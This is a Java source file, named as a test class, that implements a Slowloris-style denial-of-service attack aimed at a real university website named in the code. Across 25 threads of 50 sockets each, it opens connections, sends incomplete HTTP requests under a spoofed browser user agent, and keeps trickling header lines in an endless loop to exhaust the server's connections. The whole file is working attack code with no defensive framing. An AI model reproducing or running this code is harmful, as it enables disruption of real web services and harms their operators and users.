package test;

import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;

public class Test {

	String host = "www.jntuh.ac.in";
	int port = 80;
	int connections = 25;
	int threads = 50;
	String primarypayload = "GET / HTTP/1.1\r\n"
			+ "Host: " + host + "\r\n"
			+ "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
			+ "Content-Length: 42\r\n";
	int tcp_timeout = 5 * 1000;
	int timeout = 100 * 1000;

	/**
	 * @param args
	 */
	public static void main(String[] args) {

		new Test().init();

	}

	private void init() {
		Thread[] t = new Thread[connections];
		for (int i = 0; i < t.length; i++) {
			new Thread(new Runnable() {

				@Override
				public void run() {
					System.out.println("I am thread : " + Thread.currentThread().getId() );
					boolean[] w = new boolean[threads];
					Socket[] s = new Socket[threads];
					int failed = 0, packets = 0;
					while (true) {
						System.out.println("Building Sockets...");
						try {
							for (int i = 0; i < threads; i++) {
								if (!w[i]) {
									s[i] = new Socket();
									InetAddress ia = InetAddress.getByName(host);
									s[i].connect(new InetSocketAddress(ia.getHostAddress(),
											port), tcp_timeout);
									w[i] = true;
									PrintWriter out = new PrintWriter(
											s[i].getOutputStream());
									out.print(primarypayload);
									out.flush();
									packets += 3;
								}
							}

							System.out.println("Sending Data...");
							for (int i = 0; i < threads; i++) {
								if (w[i]) {
									PrintWriter out = new PrintWriter(
											s[i].getOutputStream());
									out.print("X-a: b\r\n");
									out.flush();
									++packets;
								}
								else {
									w[i] = false;
									++failed;
								}
							}
							System.out.println("Packets send: " + packets);
							System.out.println("Packets failed: " + failed);
							Thread.sleep(timeout);
						} catch (Exception e) {
							++failed;
							System.out.println(e);
						}
					}
				}

			}).start();
		}

	}

}
